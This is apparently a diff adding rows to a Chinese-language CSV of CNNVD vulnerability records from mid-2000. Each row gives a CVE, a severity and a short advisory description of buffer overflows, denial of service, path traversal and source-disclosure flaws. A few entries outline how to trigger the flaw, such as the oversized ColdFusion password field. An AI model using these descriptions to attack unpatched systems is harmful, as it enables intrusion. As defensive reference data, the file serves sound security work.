+Microsoft SQL Server 7.0系统管理员密码泄露漏洞,CNNVD-200005-108,2000-05-30,2006-09-01,低危,授权问题,"Microsoft SQL Server 7.0版本中Mixed Mode认证功能在任意用户可读的超长文件的明文中存储了系统管理员账户，又称为""SQL Server 7.0 Service Pack Password""漏洞。",CVE-2000-0402
+ITHouse Mail Server 1.04缓冲区溢出漏洞,CNNVD-200005-107,2000-05-30,2005-05-02,超危,授权问题,ITHouse mail server 1.04版本存在缓冲区溢出漏洞。远程攻击者借助超长RCPT TO邮件命令可以执行任意命令。,CVE-2000-0488
+Microsoft Media Service DoS漏洞,CNNVD-200005-106,2000-05-30,2005-10-12,低危,其他,"Microsoft Windows Media Encoder存在漏洞。远程攻击者借助畸形请求导致拒绝服务，又称为""Malformed Windows Media Encoder Request""漏洞。",CVE-2000-0495
+Microsoft SQL Server DTS 密码泄露漏洞,CNNVD-200005-105,2000-05-30,2006-09-01,低危,授权问题,"Microsoft SQL Server存在漏洞。本地用户借助Data Transformation Service (DTS)包的属性对话框可以获得数据库密码，又称为""DTS Password""漏洞。",CVE-2000-0485
+TACACS+ 拒绝服务漏洞,CNNVD-200005-104,2000-05-30,2005-05-02,低危,授权问题,Cisco TACACS+ tac_plus服务器存在缓冲区溢出漏洞漏洞。远程攻击者借助含有超长长度字段的畸形包导致拒绝服务。,CVE-2000-0486
+KDE 1.1.2 Kapplication任意文件覆盖漏洞,CNNVD-200005-110,2000-05-31,2005-05-02,高危,授权问题,KDE 1.1.2版本的配置文件管理功能中KApplication类允许本地用户覆盖任意文件。,CVE-2000-0530
+Apache Web Server(Win32)根目录访问漏洞,CNNVD-200005-109,2000-05-31,2021-06-07,低危,其他,Apache是一款广泛使用的开放源代码WEB服务程序。 Apache Web Server 1.3.x(Win32)对于请求路径的处理上存在漏洞，远程攻击者利用此漏洞通过请求包含大量的‘/’字符串的URL获取目录列表信息。,CVE-2000-0505
+Imate Webmail Server 2.5拒绝服务漏洞,CNNVD-200006-005,2000-06-01,2005-05-02,低危,授权问题,Imate Webmail Server 2.5版本存在漏洞。远程攻击者借助超长HELLO命令导致拒绝服务漏洞。,CVE-2000-0507
+Sambar Server 4.3缓冲区溢出漏洞,CNNVD-200006-009,2000-06-01,2005-10-20,超危,授权问题,Sambar Server 4.3版本中finger和whois示范脚本存在缓冲区溢出漏洞。远程攻击者借助超长主机名可以执行任意命令。,CVE-2000-0509
+NetWin dmail NetWin DSMTP缓冲区溢出漏洞,CNNVD-200006-003,2000-06-01,2005-07-27,超危,授权问题,NetWin dmail包中NetWin DSMTP 2.7q版本存在缓冲区溢出漏洞。远程攻击者借助超长ETRN请求可以执行任意命令。,CVE-2000-0490
+Simple Network Time Sync守护进程缓冲区溢出漏洞,CNNVD-200006-008,2000-06-01,2005-05-02,超危,授权问题,Time Sync守护进程存在缓冲区溢出漏洞。远程攻击者借助超长字符串导致拒绝服务或执行任意命令。,CVE-2000-0493
+多个供应商xterm（及衍生产品）拒绝服务漏洞,CNNVD-200006-004,2000-06-01,2005-10-20,低危,其他,"xterm, Eterm和rxvt存在漏洞。攻击者通过嵌入迫使窗口调整大小的转义字符导致拒绝服务漏洞。",CVE-2000-0476
+Apple macOS 安全漏洞,CNNVD-200006-007,2000-06-01,2022-08-18,超危,其他,Apple macOS是美国苹果（Apple）公司的一套专为Mac计算机所开发的专用操作系统。 Apple macOS 存在安全漏洞，该漏洞源于系统无法向正在访问的用户提供适当合法的消息或警告。,CVE-1999-0590
+Microsoft Windows 2000默认40位加密保护存储漏洞,CNNVD-200006-001,2000-06-01,2005-10-20,低危,授权问题,"Windows 2000的保护存储无法选择最强的可用加密。此漏洞导致使用默认40位加密而不是56位加密，又称为""Protected Store Key Length""漏洞。",CVE-2000-0487
+Real Networks RealServer远程拒绝服务攻击漏洞,CNNVD-200006-010,2000-06-01,2006-01-05,高危,授权问题,RealServer是Real Networks开发的流式音频/视频服务系统。 RealServer 7.0存在远程拒绝服务攻击漏洞。如果RealServer 7.0收到一个特殊格式的请求，指定了文件，却没有指定参数，就会停止响应，只有重新启动服务才能恢复正常工作。缺省RealServer 7.0监听的端口是8080,CVE-2000-0474
+Allegro RomPager畸形URL请求DoS漏洞,CNNVD-200006-006,2000-06-01,2005-05-02,高危,授权问题,Allegro RomPager HTTP服务器存在漏洞。远程攻击者借助畸形认证请求导致拒绝服务。,CVE-2000-0470
+splitvt 1.6.3缓冲区溢出漏洞,CNNVD-200006-002,2000-06-01,2005-05-02,高危,授权问题,Linux splitvt 1.6.3和更早的版本存在缓冲区溢出漏洞。本地用户借助屏幕锁定功能的超长密码可以提升根特权。,CVE-2000-0467
+HP-UX 10.20 and 11 man文件覆盖漏洞,CNNVD-200006-011,2000-06-02,2005-05-02,中危,授权问题,HP-UX 10.20和11版本中man存在漏洞。本地攻击者借助符号链接攻击可以覆盖文件。,CVE-2000-0468
+PassWD 1.2弱加密漏洞,CNNVD-200006-012,2000-06-04,2005-10-20,低危,授权问题,PassWD 1.2版本使用弱加密（琐碎编码）存储密码。能读取密码文件的攻击者利用此漏洞可以轻松破解密码。,CVE-2000-0492
+xinetd 2.1.8.x连接限制漏洞,CNNVD-200006-013,2000-06-04,2005-05-02,高危,授权问题,xinetd 2.1.8.x版本存在漏洞。如果主机名用于访问控制且连接主机没有反向DNS入口，则无法正确限制连接。,CVE-2000-0536
+CGI-World Poll远程泄漏文件内容漏洞,CNNVD-200007-005,2000-06-04,2005-05-02,高危,授权问题,Poll 是一个用PERL编写的CGI程序，用于在网站上进行投票。 2.0版本的Poll存在一个问题可能会导致系统目录中的文件内容泄露。 Poll的Poll_It_SSI_v2.0.cgi程序可接受很多变量，这些变量可以被远程用户在提交的HTTP请求中控制，但是Poll并没有很好的限制这些输入的变量，可以用来查看系统中任意文件内容。恶意用户可以在data_dir参数中指定要查看的文件。,CVE-2000-0590
+Microsoft Internet Explorer 安全漏洞,CNNVD-200006-021,2000-06-05,2021-07-26,低危,其他,"Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Internet Explorer 4.x 和5.x版本存在安全漏洞。如果用户建立新的SSL会话，此会话建立在同一Internet Explorer会话的相同服务器上，无法重新验证SSL认证，又称为一两个不同""SSL Certificate Validation""漏洞。",CVE-2000-0519
+Microsoft Windows NT 4.0 / 2000 SMB写请求DoS漏洞,CNNVD-200006-019,2000-06-05,2005-10-20,低危,其他,Windows NT和Windows 2000主机存在漏洞。远程攻击者借助包含无效数据长度的畸形DCE/RPC SMBwriteX请求导致拒绝服务。,CVE-2000-0544
+BRU备份软件漏洞,CNNVD-200006-018,2000-06-05,2006-08-23,高危,授权问题,BRU备份软件存在漏洞。本地用户通过指定含有BRUEXECLOG环境变量的备份配置文件可以添加数据到任意文件。,CVE-2000-0537
+Microsoft Outlook和Outlook Express 安全漏洞,CNNVD-200006-016,2000-06-05,2020-04-07,低危,其他,Microsoft Outlook和Outlook Express中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。,CVE-2000-0524
+Savant web服务器源代码读取漏洞,CNNVD-200006-014,2000-06-05,2005-05-02,低危,授权问题,Savant web服务器存在漏洞。远程攻击者借助包括HTTP版本号的GET请求可以读取源代码。,CVE-2000-0521
+Microsoft Internet Explorer 安全漏洞,CNNVD-200006-020,2000-06-05,2021-07-26,低危,其他,"Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Microsoft Internet Explorer存在安全漏洞。Internet Explorer 4.x和5.x版本无法正确地验证SSL证书的所有内容，如果连接是通过图像或帧连到服务器的。又称为一两个不同""SSL Certificate Validation""漏洞。",CVE-2000-0518
+Cmail 2.4.7 web接口缓冲区溢出漏洞,CNNVD-200006-015,2000-06-05,2005-05-02,低危,授权问题,Cmail 2.4.7版本的web接口存在缓冲区溢出漏洞。远程攻击者借助运行在端口8002用户目录的超大用户名导致拒绝服务漏洞。,CVE-2000-0556
+Cmail 2.4.7 web接口缓冲区溢出漏洞,CNNVD-200006-017,2000-06-05,2005-05-02,超危,授权问题,Cmail 2.4.7版本的web接口存在缓冲区溢出漏洞。远程攻击者借助超长GET请求可以执行任意命令。,CVE-2000-0557
+EServ 2.9.2日志记录功能缓冲区溢出漏洞,CNNVD-200006-025,2000-06-06,2005-05-02,超危,授权问题,EServ 2.9.2和以前的版本中日志记录功能存在缓冲区溢出漏洞。攻击者借助超长MKD命令可以执行任意命令。,CVE-2000-0523
+Shiva Access Manager全局可读LDAP密码漏洞,CNNVD-200006-022,2000-06-06,2006-08-09,高危,配置错误,当配置为存储配置信息在LDAP目录时，Shiva Access Manager 5.0.0版本存在全局可读的明文文件存储了根DN(可分辨名称)名称和密码。本地攻用户利用此漏洞可以危及LDPA服务器。,CVE-2000-0516
+Check Point Firewall-1拒绝服务漏洞,CNNVD-200006-024,2000-06-06,2006-01-04,低危,授权问题,Check Point Firewall-1存在漏洞。远程攻击者通过传送大量的畸形分段的IP包可以导致拒绝服务漏洞。,CVE-2000-0482
+Microsoft Internet Explorer 安全漏洞,CNNVD-200006-023,2000-06-06,2021-07-26,低危,其他,Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Internet Explorer 5.01版本的WebBrowser IFRAME存在安全漏洞。远程攻击者借助NavigateComplete2事件可以违反跨框架的安全策略。,CVE-2000-0503
+HP Openview Network Node Manager 缓冲区溢出漏洞,CNNVD-200006-026,2000-06-06,2005-05-02,高危,授权问题,HP Openview Network Node Manager 6.1版本存在缓冲区溢出漏洞。远程攻击者借助端口2345中的Alarm服务(OVALARMSRV)导致拒绝服务。,CVE-2000-0558
+ICQ 2000A ICQwebmail信息泄露漏洞,CNNVD-200006-027,2000-06-06,2005-05-02,低危,授权问题,ICQ 2000A中ICQwebmail 客户端登录过程创建了全局可读的临时文件并无法删除。本地用户利用此漏洞可以获得敏感信息。,CVE-2000-0552
+Computer Associates eTrust入侵检测系统安全漏洞,CNNVD-200006-034,2000-06-07,2021-04-12,低危,其他,eTrust入侵检测系统（以前称为SessionWall-3）使用弱加密系统(XOR)存储注册表中管理员密码。本地用户利用此漏洞可以轻松破解密码。,CVE-2000-0559
+FreeBSD apsfilter软件命令执行漏洞,CNNVD-200006-030,2000-06-07,2005-05-02,中危,授权问题,FreeBSD ports包中apsfilter软件不能正确读取用户过滤器配置。本地用户利用此漏洞可以像lpd用户一样执行任意命令。,CVE-2000-0534
+2000-1-14 FreeBSD SSH端口访问漏洞,CNNVD-200006-029,2000-06-07,2005-05-02,高危,授权问题,"2000-01-14的SSH FreeBSD补丁配置ssh侦听端口22和端口722。远程攻击者利用此漏洞可以通过端口722访问SSH,即使端口22在其他方面被过滤。",CVE-2000-0532
+Allaire ColdFusion index.cfm远程拒绝服务攻击漏洞,CNNVD-200006-028,2000-06-07,2005-05-02,低危,授权问题,Allaire ColdFusion是一种流行的Web功能扩展软件包，可以运行在Windows、HP-UX、Linux等多种平台上。 Allaire ColdFusion v4.5.1及其以前版本在处理口令验证请求过程中存在一个安全漏洞，如果在管理员登录页面的口令域里输入超过40000个字符，CPU占用率将达到100%，进程挂起，造成拒绝服务攻击。 登录页面表单默认会阻止你输入超过40000个字符，然而恶意用户可以下载页面到本地，修改后向ColdFusion服务器提交超过40000个字符。为了恢复正常功能，必须重启ColdFusion服务。 管理员登录页面可以通过如下链接获得： http://www.target.com/cfide/administrator/index.cfm 修改域尺寸和POST action，就允许提交超过40000个字符。,CVE-2000-0538
+i-drive Filo 1.0.0.1缓冲区溢出漏洞,CNNVD-200006-033,2000-06-07,2005-07-27,超危,授权问题,i-drive Filo软件的HTTP代理服务器存在缓冲区溢出漏洞。远程攻击者借助超长HTTP GET请求可以执行任意命令。,CVE-2000-0376
+HP SNMPD文件许可漏洞,CNNVD-200006-032,2000-06-07,2005-05-02,低危,授权问题,HP-UX 11.0版本中SNMP守护程序(snmpd)的snmpd.conf配置文件存在漏洞。本地用户利用此漏洞可以修改SNMP文件或提升特权。,CVE-2000-0515
+多个Linux供应商restore缓冲区溢出漏洞,CNNVD-200006-031,2000-06-07,2005-10-20,高危,授权问题,dump包中restore程序0.4b17和更早的版本存在缓冲区溢出漏洞。本地用户借助超长磁带名称可以执行任意命令。,CVE-2000-0520
+多个供应商JSP源代码泄露漏洞,CNNVD-200006-040,2000-06-08,2006-08-21,低危,授权问题,IBM WebSphere服务器 3.0.2版本存在漏洞。远程攻击者通过请求提供大写扩展名的URL可以查看JSP程序源代码。,CVE-2000-0497
+多个供应商JSP源代码泄露漏洞,CNNVD-200006-036,2000-06-08,2005-07-27,低危,授权问题,Unify eWave ServletExec存在漏洞。远程攻击者通过请求提供大写扩展名的URL可以查看JSP程序的源代码。,CVE-2000-0498
+Microsoft Windows NT 4.0远程注册表请求DoS漏洞,CNNVD-200006-038,2000-06-08,2005-10-12,低危,其他,"Microsoft Windows NT 4.0远程注册表存在漏洞。本地验证用户借助畸形请求可以导致拒绝服务，这导致winlogon进程失败。又称为""Remote Registry Access Authentication"" 漏洞。",CVE-2000-0377
+Lilikoi Ceilidh 2.60多个漏洞,CNNVD-200006-042,2000-06-08,2005-10-20,中危,其他,Ceilidh存在漏洞。远程攻击者借助translated_path 隐藏表单域可以获得Ceilidh目录的真正路径。,CVE-2000-0554
+OpenSSH UseLogin漏洞,CNNVD-200006-039,2000-06-08,2006-09-05,超危,授权问题,OpenSSH在用UseLogin选项启动时无法降低权限。本地用户通过向ssh守护程序提供命令可以执行任意命令。,CVE-2000-0525
+Mcafee VirusScan访问控制漏洞,CNNVD-200006-041,2000-06-08,2005-05-02,低危,授权问题,Mcafee VirusScan 4.03版本在将警报文本文件传送到Central Alert服务器之前无法正确限制访问权。本地用户利用此漏洞可以以任意方式修改警报。,CVE-2000-0502
+BEA WebLogicJSP源代码泄露漏洞,CNNVD-200006-037,2000-06-08,2005-05-02,低危,授权问题,BEA WebLogic 3.1.8至4.5.1版本的默认配置存在漏洞。远程攻击者通过请求提供大写扩展名的URL可以查看JSP程序的源代码。,CVE-2000-0499
+RSA ACE/Server拒绝服务漏洞,CNNVD-200006-035,2000-06-08,2005-05-02,中危,授权问题,RSA ACE/Server存在漏洞。远程攻击者通过用UDP包使服务器认证请求端口溢出导致拒绝服务，从而导致系统崩溃。,CVE-2000-0522
+Kerberos4 KDC AUTH_MSG_KDC_REQUEST无效终止漏洞,CNNVD-200006-048,2000-06-09,2020-01-22,低危,其他,Kerberos 4 KDC程序无法正确检查出AUTH_MSG_KDC_REQUEST请求的无效终止。远程攻击者借助畸形请求导致拒绝服务。,CVE-2000-0549
+Linux Capabilities漏洞,CNNVD-200006-051,2000-06-09,2007-05-16,超危,授权问题,"Linux 2.2.16之前版本中""capabilities""功能存在漏洞。本地用户通过设置capabilities阻止setuid程序降低权限daozhijjfw，又称为""Linux kernel setuid/setcap vulnerability.""",CVE-2000-0506
+3R Soft MailStudio 2000多重漏洞,CNNVD-200006-050,2000-06-09,2005-10-20,超危,授权问题,MailStudio 2000 2.0和更早的版本的userreg.cgi CGI程序存在漏洞。远程攻击者借助shell元字符可以执行任意命令。,CVE-2000-0527
+Kerberos4 KDC AUTH_MSG_KDC_REQUEST无效终止漏洞,CNNVD-200006-047,2000-06-09,2021-02-03,中危,其他,Kerberos 4 KDC程序存在缓冲区溢出漏洞。远程攻击者借助kerb_err_reply函数中e_msg变量导致拒绝服务。,CVE-2000-0548
+3R Soft MailStudio 2000多重漏洞,CNNVD-200006-044,2000-06-09,2005-10-20,低危,授权问题,MailStudio 2000 2.0和更早的版本的mailview.cgi CGI程序存在漏洞。远程攻击者借助..(点 点)攻击可以读取任意文件。,CVE-2000-0526
+"Kerberos4 KDC ""double-free"" 拒绝服务漏洞",CNNVD-200006-049,2000-06-09,2020-01-22,中危,其他,"Kerberos 4 KDC程序不正确释放内存两次(又称为 ""double-free"")。远程攻击者利用此漏洞导致拒绝服务。",CVE-2000-0550
+Kerberos4 KDC AUTH_MSG_KDC_REQUEST无效终止漏洞,CNNVD-200006-045,2000-06-09,2021-02-03,低危,其他,Kerberos 4 KDC程序存在缓冲区溢出漏洞。远程攻击者借助process_v4函数中localrealm变量导致拒绝服务漏洞。,CVE-2000-0547
+Kerberos4 KDC AUTH_MSG_KDC_REQUEST无效终止漏洞,CNNVD-200006-043,2000-06-09,2021-02-03,低危,其他,Kerberos 4 KDC程序存在缓冲区溢出漏洞。远程攻击者借助set_tgtkey函数中lastrealm变量导致拒绝服务。,CVE-2000-0546
+Ceilidh拒绝服务漏洞,CNNVD-200006-046,2000-06-09,2005-08-17,中危,授权问题,Ceilidh存在漏洞。远程攻击者借助大量POST请求导致拒绝服务。,CVE-2000-0555
+Big Brother命令任意执行漏洞,CNNVD-200006-052,2000-06-11,2005-05-02,高危,授权问题,Big Brother 1.4h2版本和更早的版本的默认配置不包含正确的访问限制。远程攻击者通过使用bbd上传文件可以执行任意命令，该文件的扩展导致其被web服务器当做CGI脚本执行。,CVE-2000-0639
+FreeBSD Alpha端口缺少/dev/random/dev/urandom漏洞,CNNVD-200006-053,2000-06-12,2006-09-21,低危,配置错误,FreeBSD的OpenSSL 0.9.4 和OpenSSH不能正确检查/dev/random或/dev/urandom设备的存在性，FreeBSD Alpha缺少这些设备。此漏洞导致设备产生容易破解的弱密钥。,CVE-2000-0535
+Tigris远程访问服务器登录认证漏洞,CNNVD-200006-054,2000-06-13,2005-05-02,低危,授权问题,Tigris远程访问服务器11.5.4.22之前的版本存在漏洞。当用户初始登录认证失败但最后成功时，无法正确记录Radius账户信息。,CVE-2000-0542
+SmartFTP Daemon 0.2访问控制漏洞,CNNVD-200006-055,2000-06-13,2005-05-02,低危,授权问题,SmartFTP Daemon 0.2版本存在漏洞。本地用户借助..(点 点)攻击通过上传并指定一个备用的用户配置文件可以访问任意文件。,CVE-2000-0565
+Norton Antivirus for Exchange漏洞,CNNVD-200006-058,2000-06-14,2005-10-12,低危,授权问题,"在某些情况下，Norton Antivirus for Exchange（NavExchange）进入""fail-open""状态，使病毒可以通过服务器。",CVE-2000-0478
+Solaris 8特权提升漏洞,CNNVD-200006-056,2000-06-14,2005-05-02,高危,授权问题,Solaris 8和更早的版本存在缓冲区溢出漏洞。本地用户借助超长路径名提升根特权。,CVE-2000-0471
+Network Associates PGP认证服务器不可解决IP地址DoS漏洞,CNNVD-200006-057,2000-06-14,2006-09-22,低危,其他,PGP Certificate Server 2.5.0和2.5.1版本的命令端口存在漏洞。远程攻击者利用此漏洞导致拒绝服务，如果主机名没有反向DNS入口并且连接到端口4000。,CVE-2000-0543
+Norton Antivirus for Exchange拒绝服务漏洞,CNNVD-200006-059,2000-06-14,2005-07-27,低危,授权问题,Norton Antivirus for Exchange (NavExchange)存在缓冲区溢出漏洞。远程攻击者借助包含超长文件名的.zip文件导致拒绝服务漏洞。,CVE-2000-0477
+GSSFTP守护程序输入验证错误漏洞,CNNVD-200006-060,2000-06-14,2020-01-22,高危,其他,Kerberos 5 1.1.x版本的GSSFTP FTP守护程序无法正确限制一些FTP命令的访问权。远程攻击者利用此漏洞导致拒绝服务，本地用户利用此漏洞可以提升根特权。,CVE-2000-0514
+Windows 2000访问控制漏洞。,CNNVD-200006-064,2000-06-15,2005-10-12,中危,授权问题,"Windows 2000存在漏洞。本地用户进程利用此漏洞可以访问相同Windows工作站内其他用户桌面，又称为""Desktop Separation""漏洞。",CVE-2000-0475
+AnalogX SimpleServer WWW 1.05 DoS漏洞,CNNVD-200006-061,2000-06-15,2006-08-24,高危,授权问题,AnalogX SimpleServer 1.05存在缓冲区溢出漏洞。远程攻击者借助cgi-bin目录程序的超长GET请求导致拒绝服务漏洞。,CVE-2000-0473
+Zope +DTMLTemplates 和DTMLMethods远程修改漏洞,CNNVD-200006-063,2000-06-15,2005-05-02,高危,授权问题,Zope 2.2和更早版本中DocumentTemplate包存在漏洞。远程攻击者利用此漏洞可以在无认证情况下修改 DTMLDocuments或DTMLMethods。,CVE-2000-0483
+Small HTTP Server 安全漏洞,CNNVD-200006-062,2000-06-15,2021-12-23,低危,其他,Small Http Server是Max Feoktistov个人开发者的一个小型 Http 服务器。 Small HTTP Server存在安全漏洞。远程攻击者借助借助超长GET请求导致拒绝服务。,CVE-2000-0484
+Shadow Op Dragon服务器多重DoS漏洞,CNNVD-200006-067,2000-06-16,2005-10-20,低危,授权问题,Dragon FTP漏洞存在漏洞。远程攻击者借助超长USER命令导致拒绝服务。,CVE-2000-0479
+Veritas Volume Manager命令添加漏洞,CNNVD-200006-068,2000-06-16,2006-03-27,高危,授权问题,Veritas Volume Manager创建了全局可写的.server_pids文件。本地用户用户利用此漏洞可以在文件中添加任意命令，然后被vmsa_server执行。,CVE-2000-0494
+Shadow Op Dragon服务器多重DoS漏洞,CNNVD-200006-066,2000-06-16,2005-10-20,低危,授权问题,Dragon telnet服务器存在漏洞。远程攻击者借助超长用户名导致拒绝服务。,CVE-2000-0480
+Alt-N MDaemon 2.8.5.0 UIDL DoS漏洞,CNNVD-200006-069,2000-06-16,2005-05-02,低危,授权问题,MDaemon 2.8.5.0版本POP服务器存在竞争条件漏洞。本地用户通过进入UIDL命令并迅速退出服务器导致拒绝服务。,CVE-2000-0501
+CUPS拒绝服务漏洞,CNNVD-200006-065,2000-06-16,2005-07-26,中危,授权问题,CUPS (Common Unix Printing System) 1.04版本无法正确删除请求文件。远程攻击者攻击者利用此漏洞导致拒绝服务。,CVE-2000-0512
+Linux rpc.statd远程格式串溢出漏洞,CNNVD-200007-039,2000-06-16,2005-05-02,超危,授权问题,rpc.statd是一种用于监视并控制NFS的RPC守护进程，广泛运行于种Unix/Linux类操作系统上，程序使用NSM(Network Status Monitor)协议。 某些Linux系统所带的nfs-utils软件包中的rpc.statd程序存在一个格式串溢出漏洞，远程攻击者可以利用此漏洞通过溢出攻击在主机上以root用户的权限执行任意指令。 通过设置特殊的格式化字符串，并在某个buffer中提供可执行代码，可能允许远程攻击者覆盖rpc.statd堆栈中的某个返回地址，远程执行任意命令是可能的。由于rpc.statd通常是以root身份运行，而且没有丢弃root权限，因此溢出代码会以root身份执行。Debian、Red Hat、Connectiva和Mandrake Linux已经发布了安全公告并提供了安全补丁。其他运行rpc.statd的Linux也存在这个问题。幸运的是，默认情况下很多Linux并没有启动rpc.statd服务。,CVE-2000-0666
+Panda Antivirus端口2001命令执行漏洞,CNNVD-200006-070,2000-06-17,2006-08-16,高危,授权问题,Panda Antivirus端口2001的控制台存在漏洞。本地用户借助CMD命令可以再无认证情况下执行任意命令。,CVE-2000-0541
+WebBBS 1.15缓冲区溢出漏洞,CNNVD-200006-075,2000-06-19,2006-09-22,高危,授权问题,WebBBS 1.15版本存在缓冲区溢出漏洞。远程攻击者借助超长HTTP GET请求可以执行任意命令。,CVE-2000-0561
+libX11 X目录拒绝服务漏洞,CNNVD-200006-073,2000-06-19,2005-05-02,低危,授权问题,libX11 X目录存在漏洞。远程攻击者借助导致libX11进入无限循环的0资源掩饰可以导致拒绝服务。,CVE-2000-0620
+Net Tools PKI服务器访问控制漏洞,CNNVD-200006-074,2000-06-19,2005-05-02,低危,授权问题,Net Tools PKI服务器存在漏洞。当XUDA模板文件不包含其他文件的绝对路径名时，则无法正确限制远程攻击者的访问权。,CVE-2000-0528
+Net Tools PKI服务器拒绝服务漏洞,CNNVD-200006-072,2000-06-19,2005-05-02,低危,授权问题,Net Tools PKI服务器存在漏洞。远程攻击者借助超长HTTP请求导致拒绝服务。,CVE-2000-0529
+XFree86 libICE拒绝服务漏洞,CNNVD-200006-071,2000-06-19,2005-05-02,低危,授权问题,XFree86中libICE存在漏洞。远程攻击者借助指定不能被SKIP_STRING宏正确检查的超大值导致拒绝服务漏洞。,CVE-2000-0504
+AIX cdmount特权提升漏洞,CNNVD-200006-077,2000-06-20,2005-05-02,高危,授权问题,AIX cdmount存在漏洞。本地用户借助shell元字符可以提升根特权。,CVE-2000-0466
+Apache Tomcat Snoop Servlet远程信息泄漏漏洞,CNNVD-200010-122,2000-06-20,2006-08-03,中危,授权问题,Apache Apache Tomcat是美国阿帕奇（Apache）软件基金会下属的Jakarta项目的一款轻量级Web应用服务器，它主要用于开发和调试JSP程序，适用于中小型系统。 Tomcat的snoop servlet组件存在一个安全问题，可能会泄漏服务器的敏感信息。 向Tomcat请求一个不存在的以 .snp 为扩展名的文件就会从服务器返回很多对入侵者很有用的信息，包括Web绝对路径，操作系统类型等。,CVE-2000-0760
+SGI IRIX WorkShop cvconnect文件覆盖漏洞。,CNNVD-200006-076,2000-06-20,2005-05-02,高危,授权问题,SGI IRIX WorkShop中cvconnect存在漏洞。本地用户利用此漏洞可以覆盖任意文件。,CVE-2000-0533
+CUPS拒绝服务漏洞,CNNVD-200006-089,2000-06-21,2005-05-02,低危,授权问题,CUPS (Common Unix Printing System) 1.04和更早的版本存在漏洞。远程攻击者借助畸形IPP请求导致拒绝服务。,CVE-2000-0510
+CUPS (Common UNIX Printing System)拒绝服务漏洞,CNNVD-200006-081,2000-06-21,2005-07-26,低危,授权问题,CUPS(Common Unix Printing System)1.04和更早的版本存在漏洞。远程攻击者通过不存在或没有shadow密码的用户名认证导致拒绝服务漏洞。,CVE-2000-0513
+BEA WebLogic 5.1.0源代码泄露漏洞,CNNVD-200006-085,2000-06-21,2005-07-27,低危,授权问题,BEA WebLogic 5.1.0版本默认配置存在漏洞。远程攻击者借助请求/file/开头的URL可以查看程序的源代码，从而导致默认servlet显示未经进一步处理的文件。,CVE-2000-0500
+多个Linux供应商KON (Kanji On Console)缓冲区溢出漏洞,CNNVD-200006-084,2000-06-21,2005-10-20,高危,授权问题,Linux Kanji on Console (KON)包中kon程序存在缓冲区溢出漏洞。本地用户借助long -StartupMessage参数可以提升根特权。,CVE-2000-0606
+IRIX crontab文件修改漏洞,CNNVD-200006-088,2000-06-21,2005-05-02,低危,授权问题,IRIX crontab创建了含有可预测文件名和用户umask的临时文件。本地用户利用此漏洞可以修改另一个用户正在编辑的crontab文件。,CVE-2000-0579
+Red Hat Linux gkermit文件修改漏洞,CNNVD-200006-083,2000-06-21,2005-05-02,中危,授权问题,Red Hat Linux setgid uucp没有正确安装gkermit。本地用户利用此漏洞可以修改属于uucp的文件。,CVE-2000-0604
+多个Linux供应商KON (Kanji On Console)缓冲区溢出漏洞,CNNVD-200006-086,2000-06-21,2005-10-20,高危,授权问题,Linux Kanji on Console (KON)包中fld程序存在缓冲区溢出漏洞。本地用户借助包含CHARSET_REGISTRY或 CHARSET_ENCODING设置的输入文件可以提升根特权。,CVE-2000-0607
+Roxen WebServer %00请求泄漏文件内容、目录列表漏洞,CNNVD-200007-058,2000-06-21,2005-07-27,低危,授权问题,Roxen WebServer是一个运行的Unix类平台上的Web服务器程序。 发现Roxen WebServer存在一个安全问题，可能会暴露CGI文件内容以及目录列表。 Roxen WebServer 对于以%00结尾的Web请求不能正确的处理，对于一个针对文件的请求，服务器会返回文件的内容，而不论该文件是否是CGI脚本；对于一个针对目录的请求，服务器会返回目录列表，不论该目录是否允许列文件。,CVE-2000-0671
+CUPS拒绝服务漏洞,CNNVD-200006-087,2000-06-21,2005-07-26,低危,授权问题,CUPS (Common Unix Printing System) 1.04版本存在漏洞。远程攻击者借助CGI POST请求导致拒绝服务。,CVE-2000-0511
+Netscape Professional Services FTP服务器漏洞,CNNVD-200006-079,2000-06-21,2005-07-27,超危,授权问题,Netscape Professional Services FTP Server 1.3.6版本存在漏洞。远程攻击者借助..(点 点)攻击可以读取任意文件。,CVE-2000-0577
+Netwin DMailWeb & CWMai多重DoS漏洞,CNNVD-200006-078,2000-06-21,2005-10-20,低危,授权问题,NetWin dMailWeb和cwMail 2.6i和更早的版本存在漏洞。远程攻击者借助超长POP参数(pophost)导致拒绝服务。,CVE-2000-0608
+IRIX MIPSPro Compiler /tmp文件名可预测漏洞,CNNVD-200006-082,2000-06-21,2005-10-20,低危,授权问题,IRIX是一款由SGI公司开发和维护的商业性质UNIX操作系统。 IRIX包含的MIPSpro编译器不正确建立临时文件，本地攻击者可以利用这个漏洞利用符号链接破坏任意文件。 MIPSPro 7.2.1分发版本的C、C++、F77等F90主要编译器，都会在/tmp目录下建立可预测文件名的文件，其权限为运行编译器的用户umask确定，本地攻击者可以通过猜测文件名，利用符号链接，以其他用户权限破坏系统任意文件，或者执行任意代码。,CVE-2000-0578
+Netwin DMailWeb & CWMai多重DoS漏洞,CNNVD-200006-090,2000-06-21,2005-10-20,低危,授权问题,NetWin dMailWeb和cwMail 2.6g及更早的版本存在漏洞。远程攻击者借助超长用户名参数导致拒绝服务。,CVE-2000-0609
+Secure Locate LOCATE_PATH认证漏洞,CNNVD-200006-080,2000-06-21,2006-08-23,中危,授权问题,Red Hat Linux中Secure Locate (slocate)存在漏洞。本地用户借助LOCATE_PATH环境变量中指定的畸形配置文件可以提升特权。,CVE-2000-0602
+Allaire JRun 2.3.x Servlet敏感信息泄露漏洞,CNNVD-200006-092,2000-06-22,2006-09-20,中危,授权问题,Allaire JRun 2.3.x版本中Servlet实例存在漏洞。远程攻击者借助SessionServlet servlet可以获得敏感信息，例如HttpSession ID列表。,CVE-2000-0539
+xconq多重缓冲区溢出漏洞,CNNVD-200006-095,2000-06-22,2005-10-20,中危,授权问题,Red Hat Linux xconq和cconq game程序存在缓冲区溢出漏洞。本地用户借助超长用户环境变量提升额外特权。,CVE-2000-0617
+Internet Security Systems BlackICE High UDP阻塞延迟漏洞,CNNVD-200006-094,2000-06-22,2006-08-23,高危,其他,BlackIce Defender 2.1及更早的版本和BlackIce Pro 2.0.23及更早的版本存在漏洞。当安全设置为Nervous或更低时，无法正确阻塞Back Orifice流量。,CVE-2000-0562
